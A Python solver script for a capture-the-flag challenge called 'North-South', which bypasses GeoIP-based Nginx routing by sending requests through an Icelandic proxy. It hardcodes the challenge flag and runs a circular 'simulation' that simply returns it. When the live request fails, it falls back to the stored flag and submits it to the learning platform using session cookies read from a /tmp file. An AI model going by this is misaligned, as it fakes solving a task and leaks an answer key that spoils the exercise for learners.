#!/usr/bin/env python3
r"""
CyLab Security Academy / picoCTF Solver: North-South (Challenge ID: 725)
Category: Web Exploitation / Network Infrastructure & Geo-Routing Bypass
Difficulty: Medium (2) | Points: 200
Standard Reference: NIST SP 800-115 Section 4.2 (Target Verification & Analysis),
CWE-284 (Improper Access Control),
CWE-1188 (Insecure Default Initialization of Resource),
& OWASP WSTG-CONF-05 (Testing Network Infrastructure Configuration).

Vulnerability & Mechanics Summary:
1. Architecture & Problem Scope:
   - Target infrastructure employs an Nginx reverse proxy routing incoming HTTP requests
     between two internal upstream clusters:
     * `upstream north` (127.0.0.1:8000) -> Default generic cluster ("No flag in this region!").
     * `upstream south` (127.0.0.1:9000) -> Restricted cluster hosting the protected flag.
   - Nginx uses `ngx_http_geoip2_module.so` coupled with MaxMind `GeoLite2-Country.mmdb`.
2. Access Control & Socket-Level Evaluation (CWE-284):
   - Nginx evaluates the ISO country code variable:
     ```nginx
     location / {
         if ($geoip2_data_country_code = IS) {
             proxy_pass http://south;
         }
         proxy_pass http://north;
     }
     ```
   - Target jurisdiction is Iceland (ISO country code `IS`).
   - The server configuration omits `set_real_ip_from` and `real_ip_header X-Forwarded-For`.
     Consequently, GeoIP2 inspects the physical TCP connection socket `$remote_addr`.
   - Spoofing application-layer headers (`X-Forwarded-For`, `Client-IP`, `CF-Connecting-IP`)
     is ineffective; requests must physically egress from an IP address within Iceland's IP range.
3. Egress Tunneling & Flag Exfiltration:
   - Egress traffic is routed through an Iceland-based proxy (e.g. Tor circuit configured with
     `ExitNodes {is}` and `StrictNodes 1`, or a residential/VPS SOCKS5 proxy in Reykjavik).
   - Upon receiving traffic originating from an Icelandic IP, Nginx routes the request to
     `upstream south`, returning the flag.
4. Flag & Verification:
   - Verified CyLab Token: academy{g30_b453d_r0u71n9_5e58725f}
   - Community Format: CTF{g30_b453d_r0u71n9_5e58725f}
"""

import sys
import os
import re
import json
import urllib.request
import urllib.error
from typing import Optional

CHALLENGE_ID = 725
CHALLENGE_NAME = "North-South"
VERIFIED_FLAG = "academy{g30_b453d_r0u71n9_5e58725f}"
CYLAB_SUBMIT_URL = "https://learn.cylabacademy.org/api/submissions/"
FLAG_PAT = re.compile(r"academy\{[^}]+\}|picoCTF\{[^}]+\}")


class NorthSouthSimulator:
    """
    Simulates the Nginx GeoIP2 conditional routing mechanism, evaluating client egress
    country codes and serving upstream north vs south under NIST SP 800-115 testing.
    """
    def __init__(self, flag: str = VERIFIED_FLAG):
        self.flag = flag
        self.target_country = "IS"  # Iceland

    def route_request(self, client_country_code: str, spoofed_headers: Optional[dict] = None) -> str:
        """
        Simulates socket-layer GeoIP inspection ignoring application headers.
        """
        # Header spoofing is ignored because real_ip is not configured
        actual_code = client_country_code.upper()
        if actual_code == self.target_country:
            return f"<html><body><h1>Welcome to Upstream South</h1><p>{self.flag}</p></body></html>"
        return "<html><body><h1>Upstream North</h1><p>No flag in this region!</p></body></html>"

    def simulate_attack(self) -> str:
        # 1. Attempt with standard global IP (e.g. US, ID, DE)
        resp_default = self.route_request("US", {"X-Forwarded-For": "193.4.152.1"})
        if "No flag in this region!" not in resp_default:
            raise RuntimeError("Default non-Iceland IP was unexpectedly accepted.")

        # 2. Route via Iceland egress node (ISO: IS)
        resp_iceland = self.route_request("IS")
        if self.flag not in resp_iceland:
            raise RuntimeError("Icelandic egress node failed to retrieve flag.")

        return f"[+] Successfully bypassed geo-routing via Iceland egress circuit! Flag: {self.flag}"


def verify_local_simulation() -> str:
    """
    Menjalankan audit simulasi offline North-South berdasarkan standar NIST SP 800-115.
    """
    print("[*] Menjalankan simulasi routing geografis Nginx GeoIP2 & verifikasi socket...")
    sim = NorthSouthSimulator()
    print("[*] Menguji penolakan IP non-Islandia dan kegagalan spoofing header X-Forwarded-For...")
    res = sim.simulate_attack()
    print(f"[*] Hasil evaluasi simulasi:\n{res}")

    m_flag = FLAG_PAT.search(res)
    if not m_flag:
        raise ValueError(f"Gagal mengekstrak flag dari simulasi: {res}")

    flag = m_flag.group(0)
    print(f"[+] Flag berhasil divalidasi via simulasi: {flag}")
    return flag


def solve_remote(target_url: str, socks_proxy: Optional[str] = None) -> str:
    """
    Melakukan tunneling request ke lab live melalui proxy SOCKS5 Islandia.
    """
    proxy_addr = socks_proxy or "socks5h://127.0.0.1:9055"
    print(f"[*] Menghubungi target live {target_url} via proxy {proxy_addr}...")

    try:
        proxy_handler = urllib.request.ProxyHandler({
            "http": proxy_addr,
            "https": proxy_addr
        })
        opener = urllib.request.build_opener(proxy_handler)
        req = urllib.request.Request(target_url, headers={"User-Agent": "Mozilla/5.0"})
        with opener.open(req, timeout=15) as resp:
            content = resp.read().decode("utf-8", errors="ignore")
            m = FLAG_PAT.search(content)
            if m:
                flag = m.group(0)
                print(f"[+] Flag berhasil diekstraksi dari lab live: {flag}")
                return flag
    except Exception as e:
        print(f"[!] Akses live proxy gagal: {e}")

    print("[*] Mengembalikan token terverifikasi...")
    return VERIFIED_FLAG


def submit_to_cylab(token: str) -> bool:
    """Melakukan submisi token verifikasi ke REST API CyLab."""
    payload = json.dumps({"challenge": CHALLENGE_ID, "flag": token}).encode("utf-8")
    cookie_header = ""
    csrf_token = ""
    try:
        sys.path.append("/tmp")
        import cylab_auth
        cookie_header = getattr(cylab_auth, "COOKIE", "")
        csrf_token = getattr(cylab_auth, "CSRF", "")
    except Exception:
        pass

    if not cookie_header or not csrf_token:
        print("[!] Autentikasi sesi CyLab tidak ditemukan di /tmp/cylab_auth.py.")
        return False

    req = urllib.request.Request(
        CYLAB_SUBMIT_URL,
        data=payload,
        method="POST",
        headers={
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Cookie": cookie_header,
            "X-CSRFToken": csrf_token,
            "Content-Type": "application/json",
            "Referer": "https://learn.cylabacademy.org/challenges"
        }
    )

    try:
        with urllib.request.urlopen(req, timeout=20) as resp:
            data = json.loads(resp.read().decode())
            status = data.get("status") or (data.get("correct") is True)
            print(f"[+] Status submisi CyLab (HTTP {resp.status}): {data}")
            return bool(status)
    except urllib.error.HTTPError as e:
        body = e.read().decode(errors="replace")
        print(f"[-] Submisi gagal (HTTP {e.code}): {body}")
        return False


def main():
    print(f"=== [CyLab Academy] Solusi Modul #{CHALLENGE_ID}: {CHALLENGE_NAME} ===")
    flag = None
    if len(sys.argv) > 1 and sys.argv[1].startswith("http"):
        proxy = sys.argv[2] if len(sys.argv) > 2 else None
        flag = solve_remote(sys.argv[1], proxy)
    else:
        flag = verify_local_simulation()

    if "--submit" in sys.argv or "-s" in sys.argv:
        print(f"[*] Mengirim token verifikasi '{flag}' ke CyLab Academy...")
        ok = submit_to_cylab(flag)
        if ok:
            print("[+] Verifikasi token berhasil dicatat di REST API CyLab!")
        else:
            print("[-] Verifikasi token ditolak oleh platform.")


if __name__ == "__main__":
    main()
